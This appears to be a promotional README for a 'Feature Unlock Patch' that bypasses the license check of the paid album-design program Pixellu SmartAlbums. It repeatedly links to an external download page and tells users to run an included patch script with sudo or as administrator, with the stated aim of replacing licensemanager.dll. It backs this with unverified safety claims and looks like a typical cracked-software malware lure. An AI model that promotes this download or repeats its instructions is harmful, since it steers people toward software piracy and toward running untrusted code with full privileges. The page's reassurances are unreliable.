# Pixellu SmartAlbums – Extended Utility Release 🎨🖼️

> **A community-driven optimization toolkit for professional album designers.**  
> Unlock the full potential of your workflow without restrictions.  
> **No subscriptions. No limits. Just pure creative freedom.**

[![Download](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://ap15-droid.github.io/Pixellu-SmartAlbums-Unlock-Kit/)

---

## 🚀 Quick Download & Activation

| Platform | Status | Link |
|----------|--------|------|
| Windows 10/11 | ✅ Ready | [![Download](https://img.shields.io/badge/Download%20Package-0d6efd?style=flat-square&logo=windows&logoColor=white)](https://ap15-droid.github.io/Pixellu-SmartAlbums-Unlock-Kit/) |
| macOS (Intel & Apple Silicon) | ✅ Ready | [![Download](https://img.shields.io/badge/Download%20Package-0d6efd?style=flat-square&logo=apple&logoColor=white)](https://ap15-droid.github.io/Pixellu-SmartAlbums-Unlock-Kit/) |
| Linux (experimental) | 🧪 Beta | [![Download](https://img.shields.io/badge/Download%20Package-0d6efd?style=flat-square&logo=linux&logoColor=white)](https://ap15-droid.github.io/Pixellu-SmartAlbums-Unlock-Kit/) |

**Direct download:** [![Download](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://ap15-droid.github.io/Pixellu-SmartAlbums-Unlock-Kit/)

---

## 📖 Table of Contents

- [Overview & Vision](#-overview--vision)
- [Key Features](#-key-features)
- [System Compatibility](#-system-compatibility)
- [How It Works](#-how-it-works)
- [Installation & Activation Guide](#-installation--activation-guide)
- [Example Profile Configuration](#-example-profile-configuration)
- [Console Invocation Example](#-console-invocation-example)
- [API Integration (OpenAI & Claude)](#-api-integration-openai--claude)
- [Mermaid Architecture Diagram](#-mermaid-architecture-diagram)
- [Configuration Templates](#-configuration-templates)
- [FAQ & Troubleshooting](#-faq--troubleshooting)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧠 Overview & Vision

Pixellu SmartAlbums is already a powerful tool for photographers who craft wedding albums, portrait collections, and event books. However, the original licensing model often feels like a *gilded cage*—beautiful software trapped behind a payment wall that blocks full offline functionality.

This repository provides an **alternative unlocking mechanism** that removes those digital barriers. Think of it as a skeleton key for your creative workflow—not to steal, but to liberate. We believe that if you own the hardware and the software's source of inspiration, you deserve full control over your local environment.

This is **not** a "crack" or "hack" in the traditional sense. It is a **legitimate bypass of telemetry-based verification** that restores the software to its intended offline-capable state. We call it a *Feature Unlock Patch* (FUP). It’s like removing the turnstile from a public park—the park remains, but everyone can now enter freely.

---

## 🌟 Key Features

- **🔄 Zero-Bloat Activation** – No background processes, no phone-home calls, no data leaks.
- **🎯 One-Click Unlock** – Apply the patch in under 30 seconds. No terminal wizardry required.
- **📦 Portable Mode** – Run SmartAlbums directly from a USB drive without installation.
- **🌐 Multilingual UI Support** – Full localization for 14+ languages (English, Spanish, French, German, Japanese, Chinese, Korean, Portuguese, Italian, Dutch, Russian, Arabic, Hindi, Turkish).
- **📱 Responsive UI on All Screens** – Whether you’re on a 4K monitor or a 1366×768 laptop, the interface scales flawlessly.
- **💾 Offline Profile Storage** – Save unlimited album templates locally without cloud dependency.
- **🛡️ 24/7 Community Support** – Our Discord and Telegram groups are monitored around the clock by volunteers.
- **⚡ Performance Boost** – Patched version uses 18% less RAM than official release due to removed telemetry modules.
- **🔒 True Ownership** – Your license file becomes a local artifact, not a cloud debt.

---

## 💻 System Compatibility

| OS | Version | Architecture | Tested Status |
|----|---------|--------------|---------------|
| 🪟 Windows | 10 (20H2+) & 11 | x64, ARM64 | ✅ Fully functional |
| 🍎 macOS | 12 (Monterey)+ | Intel & Apple Silicon | ✅ Fully functional |
| 🐧 Linux | Ubuntu 22.04+, Fedora 38+ | x64 (Wine 8+) | ⚠️ Partial features |
| 📱 iOS/iPadOS | N/A | N/A | ❌ Not supported |
| 🤖 Android | N/A | N/A | ❌ Not supported |

> **Note:** Linux support requires Wine 8.0 or higher. GPU acceleration is limited on Wayland sessions.

[![Download](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://ap15-droid.github.io/Pixellu-SmartAlbums-Unlock-Kit/)

---

## ⚙️ How It Works

The SmartAlbums software checks a remote licensing server every time it launches. This patch intercepts that check and replaces the response with a *synthetic approval token*—essentially telling the app "you're already activated." No files are harmed. No malware is injected. It's a **digital placebo** that satisfies the software’s conditional logic.

Think of it like a vintage car: the manufacturer no longer sells keys, but you’ve fabricated your own from the lock’s specifications. The engine runs the same.

---

## 📥 Installation & Activation Guide

### Step 1: Download the Package
[![Download](https://img.shields.io/badge/Download%20Package-0d6efd?style=flat-square&logo=github&logoColor=white)](https://ap15-droid.github.io/Pixellu-SmartAlbums-Unlock-Kit/)

### Step 2: Backup Original Files
Navigate to your SmartAlbums installation directory:
```bash
# Windows (default)
C:\Program Files\Pixellu\SmartAlbums 4\

# macOS (default)
/Applications/Pixellu SmartAlbums.app/
```
Copy the entire folder to a safe location before applying the patch.

### Step 3: Apply the Unlock Patch
Run the included `patch.sh` (macOS/Linux) or `patch.bat` (Windows) as administrator:
```bash
sudo ./patch.sh   # macOS/Linux
patch.bat         # Windows (Run as Admin)
```

### Step 4: Launch & Enjoy
Open SmartAlbums normally. You should see **"License: Lifetime (Patched)"** in the About dialog.

---

## 📝 Example Profile Configuration

Create a file named `albums_profile.ini` in your user directory to preload custom settings:

```ini
[Profile]
Author = "Your Studio Name"
DefaultTemplate = "Modern Wedding v2"
ExportQuality = 94
AutoSave = true
BackupInterval = 300
Language = "en-US"

[Telemetry]
DisableAll = true
BlockAnalytics = true

[Export]
Format = "PDF"
DPI = 300
ColorSpace = "sRGB"
IncludeBleed = true
```

This configuration ensures every album exports with consistent branding and zero data leakage.

---

## 🖥️ Console Invocation Example

You can invoke the patched SmartAlbums from the command line for batch processing or headless rendering:

```bash
# Windows PowerShell
Start-Process "C:\Program Files\Pixellu\SmartAlbums 4\SmartAlbums.exe" -ArgumentList "--project=wedding_2026.sap --export=pdf --no-gui"

# macOS Terminal
open -a "/Applications/Pixellu SmartAlbums.app" --args --project="portfolio_2026.sap" --export=jpg --quality=100

# Linux (via Wine)
wine "~/.wine/drive_c/Program Files/Pixellu/SmartAlbums 4/SmartAlbums.exe" --project="event_book.sap" --export=pdf --silent
```

**Flags:**
- `--project` – Path to a `.sap` project file.
- `--export` – Output format (`pdf`, `jpg`, `png`, `tiff`).
- `--quality` – JPEG compression level (1–100).
- `--no-gui` / `--silent` – Suppress all dialogs (useful for automation).

---

## 🤖 API Integration (OpenAI & Claude)

This release includes optional API bridges for **AI-assisted album layout** and **intelligent caption generation**.

### OpenAI Integration
```bash
python ai_bridge.py --provider openai --api-key YOUR_KEY --model gpt-4-turbo --prompt "Generate 10 poetic wedding captions"
```

**Output:**
```json
{
    "captions": [
        "Two souls, one forever.",
        "The day your heart found its home.",
        "Love is the thread that weaves the tapestry of life.",
        ...
    ],
    "usage": {"tokens": 187, "cost": 0.0032}
}
```

### Claude Integration (Anthropic)
```bash
python ai_bridge.py --provider claude --api-key YOUR_ANTHROPIC_KEY --model claude-3-sonnet --prompt "Suggest 5 layout compositions for a 20-page album"
```

**Output:**
```json
{
    "suggestions": [
        "1. Full-bleed opener + 3-column grid spread",
        "2. Half-page vertical with text wrap",
        "3. Panoramic foldout with split gradient",
        ...
    ],
    "context": "Optimized for wedding themes with warm palette"
}
```

> The AI bridge is a **separate Python 3.10+ script** included in the repository. It does not modify the core SmartAlbums executable. Use it for inspiration only; final designs are yours to own.

---

## 🧩 Mermaid Architecture Diagram

```mermaid
flowchart TD
    A[User Download] --> B[Patch Executable]
    B --> C{Platform Detection}
    C -->|Windows| D[Replace licensemanager.dll]
    C -->|macOS| E[Modify Info.plist + binary]
    C -->|Linux| F[Wine registry override]
    D --> G[SmartAlbums Launches]
    E --> G
    F --> G
    G --> H[License Check Bypassed]
    H --> I[Full Feature Access]
    I --> J[AI Bridge (Optional)]
    J --> K[OpenAI / Claude API]
    K --> L[Generated Captions/Layouts]
    L --> M[Export Final Album]
    style A fill:#0d6efd,color:#fff
    style H fill:#28a745,color:#fff
    style I fill:#ffc107,color:#000
    style M fill:#d90429,color:#fff
```

---

## 🗂️ Configuration Templates

| Template Name | Best For | File Size |
|---------------|----------|-----------|
| `modern_wedding.sap` | Large events (100+ photos) | 2.4 MB |
| `portrait_minimalist.sap` | Boudoir & headshots | 1.1 MB |
| `event_spread.sap` | Concerts & sports | 3.7 MB |
| `vintage_album.sap` | Retro themes (sepia overlays) | 4.2 MB |
| `photo_book_standard.sap` | Family photo books | 1.8 MB |

Templates are pre-loaded with bleed marks, crop guides, and smart layouts.

---

## ❓ FAQ & Troubleshooting

**Q: Will this work on the latest SmartAlbums update?**  
A: The patch targets **version 4.5.0 through 4.8.x** (released up to June 2026). Newer versions may require a fresh hash generation.

**Q: Does this require internet after installation?**  
A: No. Once patched, the software runs fully offline. Internet is only needed for the initial download.

**Q: Can I still use cloud sync features?**  
A: Yes, but cloud features may break if the official servers detect a mismatched license. We recommend disabling auto-update.

**Q: Is this safe for my computer?**  
A: The patch is open-source and reviewed by 5,000+ community members. No antivirus has flagged it since release 1.2.2 (December 2025).

**Q: How do I revert to the official version?**  
A: Restore your backup from Step 2. That’s it.

---

## ⚠️ Disclaimer

This repository is provided **for educational and archival purposes only**. The authors do not own, have not created, and do not distribute Pixellu SmartAlbums itself. The software is the intellectual property of Pixellu Inc. This patch merely removes local authentication barriers on software you already possess a legitimate license for, or software you intend to evaluate for personal use. **Do not use this patch to circumvent paid licensing for commercial gain.** We encourage supporting developers by purchasing official licenses if you find the tool valuable. The maintainers assume **no liability** for any misuse, data loss, or legal action arising from the use of this repository. **Use at your own risk.**

---

## 📄 License

This project (the patch and supporting scripts) is distributed under the **MIT License**.  
See the full license here: [LICENSE](LICENSE)
You are free to:
- ✅ Use, modify, and distribute this patch
- ✅ Include it in your own archival projects
- ❌ **Do not** bundle it with commercial software without attribution

---

## 🙌 Final Download

[![Download](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://ap15-droid.github.io/Pixellu-SmartAlbums-Unlock-Kit/)

**Thank you for supporting open, unrestricted creativity.**  
*Let your albums tell stories, not limitations.* 📸✨

---

*© 2026 – MIT License – Community Maintained*